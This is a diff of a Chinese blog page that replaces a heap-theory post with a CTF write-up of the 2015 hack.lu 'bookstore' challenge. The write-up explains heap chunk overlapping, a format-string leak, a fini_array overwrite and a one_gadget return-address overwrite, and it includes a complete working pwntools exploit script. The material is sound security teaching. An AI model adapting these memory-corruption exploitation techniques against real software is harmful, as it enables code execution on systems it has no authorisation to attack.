@@ -79,7 +79,7 @@
 
 
 
-  <meta name="keywords" content="pwn基础,">
+  <meta name="keywords" content="堆的利用（chunk_overlapping）,">
 
 
 
@@ -90,18 +90,25 @@
 
 
 
-<meta name="description" content="最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己">
-<meta name="keywords" content="pwn基础">
+<meta name="description" content="预览： 程序为64位，然后没有relro，没有pie，给pie带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符">
+<meta name="keywords" content="堆的利用（chunk_overlapping）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆的理论知识学习">
-<meta property="og:url" content="http://yoursite.com/2019/02/13/堆的理论知识学习/index.html">
+<meta property="og:title" content="2015-hacklu-bookstore">
+<meta property="og:url" content="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/index.html">
 <meta property="og:site_name" content="QingHe">
-<meta property="og:description" content="最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己">
+<meta property="og:description" content="预览： 程序为64位，然后没有relro，没有pie，给pie带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-29T17:08:18.863Z">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1f93c31b73.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c98983d.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c98799c.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca225c978e15.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca22b487c554.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca22f5ebf0bd.png">
+<meta property="og:updated_time" content="2019-04-01T15:40:49.531Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="堆的理论知识学习">
-<meta name="twitter:description" content="最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己">
+<meta name="twitter:title" content="2015-hacklu-bookstore">
+<meta name="twitter:description" content="预览： 程序为64位，然后没有relro，没有pie，给pie带来很大方便。放进ida看看基本功能：  可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。  这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。  可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/01/5ca1f93c31b73.png">
 
 
 
@@ -131,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/13/堆的理论知识学习/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/">
 
 
 
 
 
-  <title>堆的理论知识学习 | QingHe</title>
+  <title>2015-hacklu-bookstore | QingHe</title>
   
 
 
@@ -306,7 +313,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/13/堆的理论知识学习/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/01/2015-hacklu-bookstore/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="XiaoXiaoRenWu's blog">
@@ -323,7 +330,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">堆的理论知识学习</h1>
+          <h1 class="post-title" itemprop="name headline">2015-hacklu-bookstore</h1>
         
 
         <div class="post-meta">
@@ -335,8 +342,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-13T16:04:07+08:00">
-                2019-02-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T19:37:35+08:00">
+                2019-04-01
               </time>
             
 
@@ -358,8 +365,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/知识积累/" itemprop="url" rel="index">
-                    <span itemprop="name">知识积累</span>
+                  <a href="/categories/ctf-writeups/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf-writeups</span>
                   </a>
                 </span>
 
@@ -376,8 +383,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/02/13/堆的理论知识学习/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/02/13/堆的理论知识学习/" itemprop="commentCount"></span>
+                <a href="/2019/04/01/2015-hacklu-bookstore/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/01/2015-hacklu-bookstore/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -399,7 +406,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  649
+                  1.7k
                 </span>
               
 
@@ -415,7 +422,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 min
+                  6 min
                 </span>
               
             </div>
@@ -436,28 +443,54 @@
       
 
       
-        <p>最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下：</p>
-<p><a href="https://introspelliam.github.io/2017/09/10/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8A/" target="_blank" rel="noopener">Linux堆内存管理深入分析上</a></p>
-<p><a href="https://introspelliam.github.io/2017/09/15/pwn/Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E4%B8%8B/" target="_blank" rel="noopener">Linux堆内存管理深入分析下</a></p>
-<p><a href="https://paper.seebug.org/255/" target="_blank" rel="noopener">PWN之堆内存管理</a></p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/malloc/" target="_blank" rel="noopener">申请内存块</a></p>
-<p><a href="https://bbs.pediy.com/thread-218346.htm" target="_blank" rel="noopener">看雪的求助</a></p>
-<p><a href="https://www.anquanke.com/post/id/149782" target="_blank" rel="noopener">较详细的内存分配过程</a></p>
-<p>Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找)</p>
-<p>这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解：</p>
-<ul>
-<li><p>所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。</p>
+        <h2 id="预览："><a href="#预览：" class="headerlink" title="预览："></a>预览：</h2><p><img src="https://i.loli.net/2019/04/01/5ca1f93c31b73.png" alt=""></p>
+<p>程序为64位，然后没有relro，没有pie，给pie带来很大方便。放进ida看看基本功能：</p>
+<p><img src="https://i.loli.net/2019/04/01/5ca225c98983d.png" alt=""></p>
+<p>可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。</p>
+<p><img src="https://i.loli.net/2019/04/01/5ca225c98799c.png" alt=""></p>
+<p>这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。</p>
+<p><img src="https://i.loli.net/2019/04/01/5ca225c978e15.png" alt=""></p>
+<p>可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符串中。</p>
+<p>接着往下看，看完后发现实际上程序功能很简单，就两个小功能，一个输入任意字节的输入功能，一个free()功能（uaf没什么用。）。</p>
+<p>暂时有用的漏洞就是<strong>格式化字符串漏洞</strong>和<strong>任意溢出漏洞</strong>。</p>
+<h2 id="漏洞如何利用："><a href="#漏洞如何利用：" class="headerlink" title="漏洞如何利用："></a>漏洞如何利用：</h2><ol>
+<li><p>以格式化字符串漏洞为主线索来逆向推理分析，<strong>如何控制dest？？？</strong>，我们发现程序中好像没有可以控制dest的功能（任意溢出漏洞虽然可以覆盖到，但是之后dest会被更新为固定的字符串）。。。真让人头秃，只有自己构造了。。。。然后发现最后一个功能里的v5指向的chunk的位置还未固定（malloc()从bins里找chunk，而bins里的chunk是可控的），所以我们可以利用任意溢出漏洞更改v7指向的chunk的大小为0x150，然后free()，再通过程序的malloc(0x140)来实现chunkoverlapping，从而使v5指向的地址位于dest地址前面，然后利用填充v5的机会构造dest。这里还需要注意的地方是free(2)的时候，因为大小属于small chunk所以会有两道检查，一个是防止和后一块合并，所以必须伪造后后一块，并使其prev_inuse位为1，另一个是后一块的prev_inuse位要为1。</p>
+<p><img src="https://i.loli.net/2019/04/01/5ca22b487c554.jpg" alt=""></p>
 </li>
-<li><p>主要内容有三点：</p>
-<ol>
-<li><p>一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构   |||    fast_bins，small_bins，large_bins，unsorted_bin。       </p>
+<li><p>相信大家都能注意到，就是程序运行了一次就结束了，而我们至少需要两次运行，一次leak，一次change，所以这里需要利用第一次的机会来将fini_arry0改为main_addr，并且泄露libc地址（main函数返回到__libc_start_main中，可以在格式化字符串前来下断点，通过查看栈的数据来查看偏移，进而获得libc地址。），现在还有一个问题是fini_arry0怎么输入进栈并且确定偏移？？？这里需要打破常规思维，<strong>需要改的数据可以不在格式化字符串里，只要偏移可以确定就行！</strong>，这时候就想到了之前的那个s给了0x80的空间，我们可以将fini_arry0输入到s里然后通过调试确定偏移。</p>
 </li>
-<li><p>二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍）          </p>
+<li><p>如果我们这时候继续往下做的时候做到最后会发现一个问题：改过got表之后程序已经几乎结束，不会再调用函数了，所以改了也没用，所以我们只能改main函数返回地址为one_gadget了，这时候我们就要确定泄露一个和返回地址的地址相对偏移不变的值，经过观察发现有一个存在，然后泄露他。</p>
+<p><img src="https://i.loli.net/2019/04/01/5ca22f5ebf0bd.png" alt=""></p>
 </li>
-<li><p>三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕<strong>怎么让这个过程变得高效</strong>来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）：</p>
-<p>当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，<strong>大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合)  {取出分配返回}  else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。</strong>   内容太多，直接看最后一篇文章吧QAQ。 orz</p>
+<li><p>第二次返回时我们的任务就变成了改ret_addr为one_gadget即可。只需要改后面的三个字节即可（可通过调试发现）。</p>
 </li>
 </ol>
+<h2 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=process(<span class="string">'./books'</span>)</span><br><span class="line">P=ELF(<span class="string">'./books'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400c8e')</span></span><br><span class="line"><span class="comment">#创建各个函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,des)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.recvuntil(<span class="string">'er:\n'</span>)</span><br><span class="line">	p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(ID+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先构造chunk1造成over lapping 并且构造dest  两个目的：1.泄露__libc_main_ret</span></span><br><span class="line"><span class="comment">#2.将fini_arry0改为main_addr</span></span><br><span class="line">fini_arry0=<span class="number">0x6011b8</span>  <span class="comment">#0x400830</span></span><br><span class="line">main_addr=<span class="number">0x400a39</span></span><br><span class="line">payload = <span class="string">'%'</span>+str(<span class="number">0xa39</span>)+<span class="string">'c%13$hn'</span>+<span class="string">'.%31$p'</span>+<span class="string">',%28$p'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+= p64(<span class="number">0x90</span>)</span><br><span class="line">payload+= p64(<span class="number">0x151</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x140</span></span><br><span class="line">payload+= p64(<span class="number">0x150</span>)              </span><br><span class="line">payload+= p64(<span class="number">0x21</span>)               <span class="comment">#为了bypass the check: !prev_inuse(next_chunk)</span></span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload+= p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)     <span class="comment">#为了使0x150的块不和nextchunk合并  </span></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">submit(<span class="string">'aaaaaaa'</span>+p64(fini_arry0))</span><br><span class="line"><span class="comment">#submit('aaaaaaa')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'.'</span>)</span><br><span class="line">date = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">','</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">date =int(date,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = int(ret_addr,<span class="number">16</span>) - <span class="number">0xd8</span> <span class="number">-0x110</span></span><br><span class="line">libcbase = date - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">one_gadget = libcbase + <span class="number">0x45216</span>  <span class="comment">#0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">log.success(<span class="string">'ret_addr = '</span> + hex(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">one_shot1 =<span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-2</span>:]</span><br><span class="line">one_shot2 =<span class="string">'0x'</span> + str(hex(one_gadget))[<span class="number">-6</span>:<span class="number">-2</span>]</span><br><span class="line">one_shot1 = int(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = int(one_shot2,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(one_shot1) + <span class="string">'d%13$hhn'</span></span><br><span class="line">payload+= <span class="string">'%'</span> + str(one_shot2-one_shot1) + <span class="string">'d%14$hn'</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=p64(<span class="number">0x151</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x140</span></span><br><span class="line">payload+= p64(<span class="number">0x150</span>)</span><br><span class="line">payload+= p64(<span class="number">0x21</span>)</span><br><span class="line">payload+= <span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">submit(<span class="string">'aaaaaaa'</span>+p64(ret_addr)+p64(ret_addr+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="我第一次做的时候的一些心得："><a href="#我第一次做的时候的一些心得：" class="headerlink" title="我第一次做的时候的一些心得："></a>我第一次做的时候的一些心得：</h2><h3 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015_hacklu_bookstore:"></a>2015_hacklu_bookstore:</h3><ul>
+<li><p>这一题看似漏洞较多，但实际上难度不小，而且知识比较综合（有格式化字符串，堆栈的结合，overlapping，uaf等），利用起来很困难，费了很大劲才弄懂exp。还要感谢看雪的师傅。</p>
+</li>
+<li><p>学到的东西：</p>
+</li>
+<li><ol>
+<li><p>使程序再次运行的方法：改写fini_arry0的内容（一般在.fini_arry段中，在ida中ctrl+s寻找位置）为main_addr，可以再次运行，但只能用一次。 </p>
+</li>
+<li><p>ida中使数字解析为字符串的方法，按r即可。</p>
+</li>
+<li><p>free(fast_bin（64位的极限是0x70）)时不需检查，而free(small_bin(64位是大于等于0x80))时，需要考虑几个因素：</p>
+<p>@1有可能会需要占位的堆块，防止被top chunk合并。                                                                                      </p>
+<p>@2可能会造成unlink效应，注意构造时的size的inuse位，检查prev_chunk的占用情况，如果要unlink，两个堆块都要在small_bin的范围内。                                                                                                                                              @3会检查next_chunk(prev_inuse)的值是否为1,而next_chunk_addr=chunk_addr+chunk_size，chunk_size为自己构造，需注意。</p>
+</li>
+</ol>
+</li>
+<li><p>利用overlapping构造格式化字符串来造成任意读写，得知偏移后提前构造栈的结构。</p>
+</li>
+<li><p>当通过格式化字符串获取任意写的功能时，除了向got表内写，还可以改写函数的返回地址为one_gadget（当然不一定能成功），这时就需要获取返回地址的地址，也就是栈中的某一个的地址，一般需要通过观察栈中数据是否有指向栈的并且和返回地址有固定的偏移，泄露其数值加上偏移即可得到返回地址的地址。</p>
+</li>
+<li><p>格式化字符串用%p打印出来的内容无需解包直接接受即可（所有内容都是字符，比如：0x600124则需要data=int(p.recv(8),16)），%s需要解包(接受时是以字符接受的，0x600124为data=u64(p.recv()[0:3].ljust(8,’\x00’)))。</p>
+</li>
+<li><p>[-2:]和[-2:0]的区别。。。</p>
+</li>
+<li><p>当利用改fini_arry0为main_addr而使程序再次回到开头时，程序的两次返回地址之间有一个固定的偏移。</p>
 </li>
 </ul>
 
@@ -506,7 +539,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn基础/" rel="tag"><i class="fa fa-tag"></i> pwn基础</a>
+            <a href="/tags/堆的利用（chunk-overlapping）/" rel="tag"><i class="fa fa-tag"></i> 堆的利用（chunk_overlapping）</a>
           
         </div>
       
@@ -519,8 +552,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/28/二进制方面知识扩充/" rel="next" title="二进制方面知识扩充">
-                <i class="fa fa-chevron-left"></i> 二进制方面知识扩充
+              <a href="/2019/03/31/hitcontraning-lab13-writeup/" rel="next" title="hitcontraning_lab13_writeup">
+                <i class="fa fa-chevron-left"></i> hitcontraning_lab13_writeup
               </a>
             
           </div>
@@ -529,8 +562,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/02/19/知识点总结与学习资料整理/" rel="prev" title="知识点总结与学习资料整理">
-                知识点总结与学习资料整理 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/01/2017-0ctf-babyheap/" rel="prev" title="2017-0ctf-babyheap">
+                2017-0ctf-babyheap <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -586,8 +619,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -659,6 +701,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预览："><span class="nav-number">1.</span> <span class="nav-text">预览：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞如何利用："><span class="nav-number">2.</span> <span class="nav-text">漏洞如何利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下："><span class="nav-number">3.</span> <span class="nav-text">exp如下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我第一次做的时候的一些心得："><span class="nav-number">4.</span> <span class="nav-text">我第一次做的时候的一些心得：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2015-hacklu-bookstore"><span class="nav-number">4.1.</span> <span class="nav-text">2015_hacklu_bookstore:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
